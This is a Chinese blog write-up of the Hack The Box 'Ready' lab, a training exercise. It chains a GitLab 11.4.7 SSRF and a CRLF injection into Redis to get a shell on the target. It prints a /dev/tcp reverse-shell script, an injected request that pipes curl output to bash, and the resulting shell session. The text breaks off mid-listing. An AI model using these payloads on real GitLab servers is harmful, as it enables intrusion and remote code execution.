@@ -1,0 +1,789 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：CVE-2018-19585、CVE-2018-19571、exp脚本修改排错、配置文件密码泄露、容器提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ready-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/01/14/Ready-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：CVE-2018-19585、CVE-2018-19571、exp脚本修改排错、配置文件密码泄露、容器提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Ready-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Ready-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Ready-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Ready-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Ready-htb-writeup/4.png">
+<meta property="article:published_time" content="2024-01-14T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-02-04T07:55:09.228Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Ready-htb-writeup/1.png">
+  
+  
+  
+  <title>Ready-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Ready-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-14 23:50" pubdate>
+          2024年1月14日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          105 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Ready-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：CVE-2018-19585、CVE-2018-19571、exp脚本修改排错、配置文件密码泄露、容器提权</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://0xdf.gitlab.io/2021/05/15/htb-ready.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.220</p>
+<p>2、扫描下开放端口情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/tools/portscan]<br>└─$ sudo ./htb-portscan.sh 10.10.10.220 tcp<br>[sudo] kali 的密码：<br>开始对 10.10.10.220 进行nmap端口扫描...<br>* 正在执行tcp协议的端口扫描探测...<br>sudo nmap -min-rate 10000 -p- <span class="hljs-string">&quot;10.10.10.220&quot;</span> -oG <span class="hljs-string">&quot;10.10.10.220&quot;</span>-tcp-braker-allports<br><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-14 20:16 CST<br>Warning: 10.10.10.220 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.220<br>Host is up (0.34s latency).<br>Not shown: 33504 closed tcp ports (reset), 32029 filtered tcp ports (no-response)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>5080/tcp open  onscreen<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 66.27 seconds<br>* 正在对开放的端口进行TCP全连接式版本探测和系统版本以及漏洞探测...<br>sudo nmap -sT -sV -sC -p<span class="hljs-string">&quot;22,5080,&quot;</span> <span class="hljs-string">&quot;10.10.10.220&quot;</span><br><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-14 20:18 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.220<br>Host is up (0.34s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)<br>|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)<br>|_  256 18:<span class="hljs-built_in">cd</span>:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)<br>5080/tcp open  http    nginx<br>|_http-trane-info: Problem with XML parsing of /evox/about<br>| http-robots.txt: 53 disallowed entries (15 shown)<br>| / /autocomplete/users /search /api /admin /profile <br>| /dashboard /projects/new /groups/new /groups/*/edit /users /help <br>|_/s/ /snippets/new /snippets/*/edit<br>| http-title: Sign <span class="hljs-keyword">in</span> \xC2\xB7 GitLab<br>|_Requested resource was http://10.10.10.220:5080/users/sign_in<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 32.80 seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、通过查看5080端口上的服务页面，发现这个是Gitlab的一个服务页面</p>
+<p><code>http://10.10.10.220:5080/robots.txt</code></p>
+<p><code>http://10.10.10.220:5080/dashboard/projects</code></p>
+<p><code>http://10.10.10.220:5080/users/sign_in</code></p>
+<p>4、这里我先注册一个账号信息</p>
+<p><code>shiyan</code></p>
+<p><code>shiyan@qq.com</code></p>
+<p><code>1234567890</code></p>
+<p><img src="http://sh1yan.top/photo/Ready-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、登录到后台后，发现了该系统的版本信息</p>
+<p><code>GitLab Community Edition 11.4.7</code></p>
+<p><img src="http://sh1yan.top/photo/Ready-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、根据搜索版本号，成功的获取到漏洞利用的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ searchsploit GitLab 11.4.7<br>------------------------------------------------------- ---------------------------------<br> Exploit Title                                         |  Path<br>------------------------------------------------------- ---------------------------------<br>GitLab 11.4.7 - RCE (Authenticated) (2)                | ruby/webapps/49334.py<br>GitLab 11.4.7 - Remote Code Execution (Authenticated)  | ruby/webapps/49257.py<br>------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ searchsploit -m ruby/webapps/49334.py<br>  Exploit: GitLab 11.4.7 - RCE (Authenticated) (2)<br>      URL: https://www.exploit-db.com/exploits/49334<br>     Path: /usr/share/exploitdb/exploits/ruby/webapps/49334.py<br>    Codes: CVE-2018-19585, CVE-2018-19571<br> Verified: False<br>File Type: Python script, ASCII text executable, with very long lines (359)<br>Copied to: /home/kali/桌面/49334.py<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 49334.py         <br>usage: 49334.py [-h] -u U -p P -g G -l L -P P<br>49334.py: error: the following arguments are required: -u, -p, -g, -l, -P<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 49334.py -u shiyan -p 1234567890 -g http://10.10.10.220 -l 10.10.14.8 -P 443<br>[+] authenticity_token: wTPcvdOYa5Ga0zcJ55JCeAEjYEBrCf0I225Pc2PP1afTJsy1rDygqr0hzu0ZTQQzxLoKrIV5/HEZbh2u3iyIhA==<br>[+] Creating project with random name: project240<br>[+] Running Exploit<br>[+] Exploit completed successfully!<br></code></pre></td></tr></table></figure>
+
+<p>7、但是这里我并没有接收到反弹过来的shell。。。。</p>
+<p>8、这里给人的感觉来说，应该就是这2个漏洞的组合，那没办法，只能手动的操作进行获取反弹shell了</p>
+<p><code>CVE-2018-19571 SSRF</code></p>
+<p><code>SSRF 漏洞是攻击者可以欺骗服务器代表他们发出请求的地方。本例中，漏洞位于新建项目-&gt;导入项目页面：</code></p>
+<p><code>当我选择“Repo by URL”时，我有机会输入 URL，服务器将向该 URL 发出 GET 请求。我将打开nc端口 80 并将其http://10.10.4.8作为 URL。该网站显示正在进行的导入只是挂起。在我的虚拟机上，收到一个请求：</code></p>
+<p><code>Git repository url</code></p>
+<p><code>http://10.10.14.8</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 80 <br>listening on [any] 80 ...<br>connect to [10.10.14.8] from (UNKNOWN) [10.10.10.220] 34996<br>GET /info/refs?service=git-upload-pack HTTP/1.1<br>Host: 10.10.14.8<br>User-Agent: git/2.18.1<br>Accept: */*<br>Accept-Encoding: deflate, gzip<br>Pragma: no-cache<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Ready-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、到这里，可以明确的是，漏洞是没错的，那继续下一个漏洞</p>
+<p><code>CVE-2018-19585 - CRLF 注入</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/projects</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.220:5080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.10.220:5080/projects/new<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>363<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.10.220:5080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>_gitlab_session=19ede108b18daaf98eb2bd6a7ca4e9cc; event_filter=all<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-llvm">utf<span class="hljs-number">8</span><span class="hljs-operator">=</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%9</span>C<span class="hljs-variable">%93</span>&amp;authenticity_token<span class="hljs-operator">=</span>EUpiOE<span class="hljs-number">0</span>fNqkr<span class="hljs-variable">%2</span>FqYMU<span class="hljs-number">7</span>Z<span class="hljs-number">3</span>UMyOwG<span class="hljs-number">8</span>uxdhGl<span class="hljs-number">7</span><span class="hljs-variable">%2</span>BVYAFwug<span class="hljs-variable">%2</span>FafEyAAyRAeXyCCgvlnK<span class="hljs-variable">%2</span>FHUYfzC<span class="hljs-number">6</span>yQi<span class="hljs-number">7</span>Ew<span class="hljs-number">1</span>hpm<span class="hljs-number">7</span>Mq<span class="hljs-number">2</span>Zw<span class="hljs-variable">%3</span>D<span class="hljs-variable">%3</span>D&amp;project<span class="hljs-variable">%5</span>Bimport_url<span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span>git<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-number">10.10</span>.<span class="hljs-number">14.8</span><span class="hljs-variable">%3</span>A<span class="hljs-number">80</span><span class="hljs-variable">%2</span>Ftest</span><br><span class="language-llvm">test<span class="hljs-number">1</span></span><br><span class="language-llvm">test<span class="hljs-number">2</span></span><br><span class="language-llvm">test<span class="hljs-number">3</span></span><br><span class="language-llvm"><span class="hljs-variable">%2</span>F.git&amp;project<span class="hljs-variable">%5</span>Bci_cd_only<span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span><span class="hljs-keyword">false</span>&amp;project<span class="hljs-variable">%5</span>Bname<span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span>test<span class="hljs-number">3</span>&amp;project<span class="hljs-variable">%5</span>Bnamespace_id<span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span><span class="hljs-number">6</span>&amp;project<span class="hljs-variable">%5</span>Bpath<span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span>test&amp;project<span class="hljs-variable">%5</span>Bdescription<span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span>&amp;project<span class="hljs-variable">%5</span>Bvisibility_level<span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span><span class="hljs-number">0</span></span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 80<br>listening on [any] 80 ...<br>connect to [10.10.14.8] from (UNKNOWN) [10.10.10.220] 35610<br>0049git-upload-pack /test <br>test1 <br>test2 <br>test3 <br>/.githost=10.10.14.8:80<br></code></pre></td></tr></table></figure>
+
+<p>10、这里确实是收到换行的内容了,这个漏洞也是没问题的，那就开始组合起来利用吧</p>
+<p>参考地址：<code>https://hackerone.com/reports/299473</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">cat</span> shell.sh         <br><span class="hljs-comment">#!/bin/bash</span><br><br>bash &gt;&amp; /dev/tcp/10.10.14.8/443 0&gt;&amp;1<br><br>创建并导入<br><br>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/.git<br><br>POST /projects HTTP/1.1<br>Host: 10.10.10.220:5080<br>User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate, br<br>Referer: http://10.10.10.220:5080/projects/new<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 394<br>Origin: http://10.10.10.220:5080<br>Connection: close<br>Cookie: _gitlab_session=19ede108b18daaf98eb2bd6a7ca4e9cc; event_filter=all<br>Upgrade-Insecure-Requests: 1<br><br>utf8=%E2%9C%93&amp;authenticity_token=VnJtV23ET0R57h8AGNw0nzeoY3mpjUYBsKFQ877zsDidREPvI%2F85lC6Ssweu9uwIqqFQHSvYFfYXyN%2F1U0m8UA%3D%3D&amp;project%5Bimport_url%5D=git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest<br> multi<br> sadd resque:gitlab:queues system_hook_push<br> lpush resque:gitlab:queue:system_hook_push <span class="hljs-string">&quot;&#123;\&quot;class\&quot;:\&quot;GitlabShellWorker\&quot;,\&quot;args\&quot;:[\&quot;class_eval\&quot;,\&quot;open(\&#x27;|curl http://10.10.14.8/shell.sh|bash\&#x27;).read\&quot;],\&quot;retry\&quot;:3,\&quot;queue\&quot;:\&quot;system_hook_push\&quot;,\&quot;jid\&quot;:\&quot;ad52abc5641173e217eb2e52\&quot;,\&quot;created_at\&quot;:1513714403.8122594,\&quot;enqueued_at\&quot;:1513714403.8129568&#125;&quot;</span><br> <span class="hljs-built_in">exec</span><br>%2F.git&amp;project%5Bci_cd_only%5D=<span class="hljs-literal">false</span>&amp;project%5Bname%5D=test8&amp;project%5Bnamespace_id%5D=6&amp;project%5Bpath%5D=test8&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.10.220 - - [16/Jan/2024 11:00:44] <span class="hljs-string">&quot;GET /shell.sh HTTP/1.1&quot;</span> 200 -<br>10.10.10.220 - - [16/Jan/2024 11:01:03] <span class="hljs-string">&quot;GET /shell.sh HTTP/1.1&quot;</span> 200 -<br>10.10.10.220 - - [16/Jan/2024 11:01:36] <span class="hljs-string">&quot;GET /shell.sh HTTP/1.1&quot;</span> 200 -<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.8] from (UNKNOWN) [10.10.10.220] 48898<br><span class="hljs-built_in">id</span><br>uid=998(git) gid=998(git) <span class="hljs-built_in">groups</span>=998(git)<br>python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>git@gitlab:~/gitlab-rails/working$ <br><br>git@gitlab:~/gitlab-rails/working$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=998(git) gid=998(git) <span class="hljs-built_in">groups</span>=998(git)<br>git@gitlab:~/gitlab-rails/working$ <br></code></pre></td></tr></table></figure>
+
+<p>11、那就获取下第一个flag信息吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">git@gitlab:~/gitlab-rails/working$ <span class="hljs-built_in">ls</span> -la /home<br><span class="hljs-built_in">ls</span> -la /home<br>total 12<br>drwxr-xr-x 1 root root 4096 Apr  5  2022 .<br>drwxr-xr-x 1 root root 4096 Apr  5  2022 ..<br>drwxr-xr-x 2 root root 4096 Apr  5  2022 dude<br>git@gitlab:~/gitlab-rails/working$ <span class="hljs-built_in">ls</span> -la /home/dude<br><span class="hljs-built_in">ls</span> -la /home/dude<br>total 